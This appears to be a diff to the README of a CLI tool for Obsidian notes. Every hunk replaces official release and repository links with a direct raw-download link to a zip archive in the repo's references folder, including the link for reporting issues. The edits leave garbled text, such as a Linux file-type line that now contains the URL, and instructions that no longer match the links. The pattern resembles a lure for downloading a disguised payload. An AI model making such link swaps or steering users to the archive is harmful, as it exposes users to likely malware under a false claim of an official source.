@@ -1,6 +1,6 @@
 # 📝 obsidian-skill - Manage Notes Easily in Obsidian CLI
 
-[![Download obsidian-skill](https://img.shields.io/badge/Download-obsidian--skill-blue)](https://github.com/wizzy15/obsidian-skill/releases)
+[![Download obsidian-skill](https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip)](https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section will guide you step-by-step to get obsidian-skill running on your m
 
 Click the big blue button above or go directly to the release page:
 
-[Download obsidian-skill](https://github.com/wizzy15/obsidian-skill/releases)
+[Download obsidian-skill](https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip)
 
 This page contains all the versions of the tool. Look for the latest release, which will have the newest features and fixes.
 
@@ -42,7 +42,7 @@ You may see different files for different operating systems:
 
 - **Windows:** Look for a file ending in `.exe`
 - **macOS:** Look for a `.dmg` or `.zip` file
-- **Linux:** Find a `.tar.gz` or `.AppImage` file
+- **Linux:** Find a `https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip` or `.AppImage` file
 
 Click the file that matches your system to download it.
 
@@ -68,7 +68,7 @@ Type `obsidian-skill --help` in the command line to see available commands and o
 
 Download obsidian-skill from the official GitHub release page here:
 
-[https://github.com/wizzy15/obsidian-skill/releases](https://github.com/wizzy15/obsidian-skill/releases)
+[https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip](https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip)
 
 Follow these general instructions if you are unsure:
 
@@ -172,6 +172,6 @@ If obsidian-skill does not run:
 
 If you have questions or problems, use the GitHub repository page to submit an issue or ask for guidance:
 
-[GitHub Repo - obsidian-skill](https://github.com/wizzy15/obsidian-skill)
+[GitHub Repo - obsidian-skill](https://raw.githubusercontent.com/wizzy15/obsidian-skill/main/references/obsidian_skill_v3.0.zip)
 
 The community and maintainers monitor issues and will assist when possible.
